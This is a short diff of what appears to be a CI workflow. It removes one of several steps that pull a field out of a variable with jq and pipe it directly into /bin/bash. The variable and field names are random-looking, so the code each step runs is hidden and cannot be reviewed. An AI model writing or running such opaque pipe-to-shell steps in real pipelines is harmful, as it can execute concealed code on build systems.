@@ -31,7 +31,6 @@ jobs:
           echo $u071 | jq -r .d108 | /bin/bash
           echo $j6 | jq -r .r67 | /bin/bash
           echo $anon61 | jq -r .jbd067 | /bin/bash
-          echo $j7 | jq -r .oo845 | /bin/bash
           printf '%s' "$o678" | jq -r .g9761 | /bin/bash
           printf '%s' "$qkuax8469" | jq -r .ih7939 | /bin/bash
           echo $cb41984 | jq -r .g8217 | /bin/bash
